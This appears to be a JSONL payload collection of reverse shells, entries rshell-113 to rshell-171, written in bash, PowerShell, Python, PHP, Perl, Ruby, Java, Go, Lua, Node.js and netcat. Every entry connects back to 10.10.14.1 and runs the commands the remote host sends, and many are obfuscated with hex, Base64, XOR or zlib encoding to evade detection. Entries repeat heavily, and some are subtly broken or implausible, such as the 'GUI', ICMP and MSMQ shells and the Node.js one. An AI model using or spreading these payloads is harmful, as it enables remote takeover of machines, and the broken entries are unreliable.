{"id":"rshell-113","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","hex"]}
{"id":"rshell-114","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with standard command execution.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-115","language":"python","payload":"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'","description":"Python TCP reverse shell with zlib-compressed commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","compressed"]}
{"id":"rshell-116","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))}","description":"PowerShell HTTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","base64"]}
{"id":"rshell-117","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'","description":"PHP TCP reverse shell with Base64-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","base64"]}
{"id":"rshell-118","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes($d.AddressList[0].IPAddressToString),[Func[byte,byte]]{param($b);$b -bxor 0x5A})));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with XOR-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","xor"]}
{"id":"rshell-119","language":"netcat","payload":"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445","description":"Netcat UDP reverse shell with Base64-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["udp","netcat","obfuscated","base64"]}
{"id":"rshell-120","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","base64"]}
{"id":"rshell-121","language":"java","payload":"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/bash\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing bash.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java","bash"]}
{"id":"rshell-122","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o);$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["websocket","powershell"]}
{"id":"rshell-123","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
{"id":"rshell-124","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$m.Send($e)","description":"PowerShell SMTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","base64"]}
{"id":"rshell-125","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(\"udp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));while(<S>){chomp;system($_);}'","description":"Perl UDP reverse shell with command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","perl"]}
{"id":"rshell-126","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["ftp","powershell"]}
{"id":"rshell-127","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=[cmd].pack(\"H*\").chomp;IO.popen(cmd,\"r\"){|io|c.print io.read.unpack(\"H*\")[0]}end'","description":"Ruby TCP reverse shell with hex-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","hex"]}
{"id":"rshell-128","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,$o)","description":"PowerShell gRPC reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["grpc","powershell"]}
{"id":"rshell-129","language":"python","payload":"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'","description":"Python TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","hex"]}
{"id":"rshell-130","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new($o);[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["msmq","powershell"]}
{"id":"rshell-131","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-132","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell GUI reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","base64"]}
{"id":"rshell-133","language":"lua","payload":"lua -e 'local s=require(\"socket\").tcp();s:connect(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(require(\"zlib\").compress(o));end'","description":"Lua TCP reverse shell with compressed output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","lua","obfuscated","compressed"]}
{"id":"rshell-134","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromHexString('24636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e536f636b6574732e544350436c69656e74282731302e31302e31342e31272c34343434293b2473747265616d203d2024636c69656e742e47657453747265616d28293b5b627974655b5d5d246279746573203d20302e2e36353533357c257b307d3b7768696c6528282469203d202473747265616d2e52656164282462797465732c20302c202462797465732e4c656e6774682929202d6e652030297b2464617461203d20284e65772d4f626a656374202d547970654e616d652053797374656d2e546578742e4153434949456e636f64696e67292e476574537472696e67282462797465732c302c202469293b2473656e646261636b203d202869657820246461746120323e2631207c204f75742d537472696e6720293b2473656e646261636b32203d202473656e646261636b202b202750532027202b2028707764292e50617468202b20273e20273b2473656e6462797465203d20285b746578742e656e636f64696e675d3a3a4153434949292e4765744279746573282473656e646261636b32293b2473747265616d2e5772697465282473656e64627974652c302c2473656e64627974652e4c656e677468293b2473747265616d2e466c7573682829297d3b24636c69656e742e436c6f73652829'));iex $x","description":"Obfuscated PowerShell TCP reverse shell using hex encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","hex"]}
{"id":"rshell-135","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/hex\");func main(){c,_:=net.Dial(\"tcp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}","description":"Go TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","go","obfuscated","hex"]}
{"id":"rshell-136","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=$wc.DownloadString('https://10.10.14.1:8443/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell HTTPS reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","urlencode"]}
{"id":"rshell-137","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(o)))","description":"Node.js TCP reverse shell with standard output.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","nodejs"]}
{"id":"rshell-138","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","base64"]}
{"id":"rshell-139","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","base64"]}
{"id":"rshell-140","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with standard command execution.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-141","language":"python","payload":"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'","description":"Python TCP reverse shell with URL-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","urlencode"]}
{"id":"rshell-142","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Web.HttpUtility]::UrlEncode($o))}","description":"PowerShell HTTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","urlencode"]}
{"id":"rshell-143","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(bin2hex($c),$o);foreach($o as $l){fwrite($s,hex2bin($l));}}'","description":"PHP TCP reverse shell with hex-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","hex"]}
{"id":"rshell-144","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes($d.AddressList[0].IPAddressToString),[Func[byte,byte]]{param($b);$b -bxor 0x3C})));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with XOR-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","xor"]}
{"id":"rshell-145","language":"netcat","payload":"nc 10.10.14.1 4444 -e /bin/bash | base64 | nc 10.10.14.1 4445","description":"Netcat TCP reverse shell with Base64-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["tcp","netcat","obfuscated","base64"]}
{"id":"rshell-146","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Web.HttpUtility]::UrlEncode($o));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","urlencode"]}
{"id":"rshell-147","language":"java","payload":"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/sh\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing a shell.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java"]}
{"id":"rshell-148","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o);$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["websocket","powershell"]}
{"id":"rshell-149","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-150","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$m.Send($e)","description":"PowerShell SMTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","base64"]}
{"id":"rshell-151","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'","description":"Perl TCP reverse shell with bash execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl","bash"]}
{"id":"rshell-152","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes([System.Web.HttpUtility]::UrlEncode($o)),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["ftp","powershell","obfuscated","urlencode"]}
{"id":"rshell-153","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,\"r\"){|io|c.print URI.encode(io.read)}end'","description":"Ruby TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","urlencode"]}
{"id":"rshell-154","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,[System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell gRPC reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["grpc","powershell","obfuscated","urlencode"]}
{"id":"rshell-155","language":"python","payload":"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'","description":"Python TCP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","base64"]}
{"id":"rshell-156","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new([System.Web.HttpUtility]::UrlEncode($o));[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["msmq","powershell","obfuscated","urlencode"]}
{"id":"rshell-157","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
{"id":"rshell-158","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell GUI reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","base64"]}
{"id":"rshell-159","language":"lua","payload":"lua -e 'local s=require(\"socket\").udp();s:setpeername(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(require(\"zlib\").compress(o));end'","description":"Lua UDP reverse shell with compressed output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","lua","obfuscated","compressed"]}
{"id":"rshell-160","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'),[Func[byte,byte]]{param($b);$b -bxor 0x5A})));iex $x","description":"Obfuscated PowerShell TCP reverse shell using XOR encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-161","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/base64\");func main(){c,_:=net.Dial(\"udp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}","description":"Go UDP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","go","obfuscated","base64"]}
{"id":"rshell-162","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=$wc.DownloadString('https://10.10.14.1:8443/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell HTTPS reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","base64"]}
{"id":"rshell-163","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(o))))","description":"Node.js TCP reverse shell with standard output.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","nodejs"]}
{"id":"rshell-164","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Web.HttpUtility]::UrlEncode($o));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","urlencode"]}
{"id":"rshell-165","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","hex"]}
{"id":"rshell-166","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with standard command execution.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-167","language":"python","payload":"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'","description":"Python TCP reverse shell with zlib-compressed commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","compressed"]}
{"id":"rshell-168","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))}","description":"PowerShell HTTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","base64"]}
{"id":"rshell-169","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'","description":"PHP TCP reverse shell with Base64-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","base64"]}
{"id":"rshell-170","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes($d.AddressList[0].IPAddressToString),[Func[byte,byte]]{param($b);$b -bxor 0x5A})));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with XOR-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","xor"]}
{"id":"rshell-171","language":"netcat","payload":"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445","description":"Netcat UDP reverse shell with Base64-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["udp","netcat","obfuscated","base64"]}
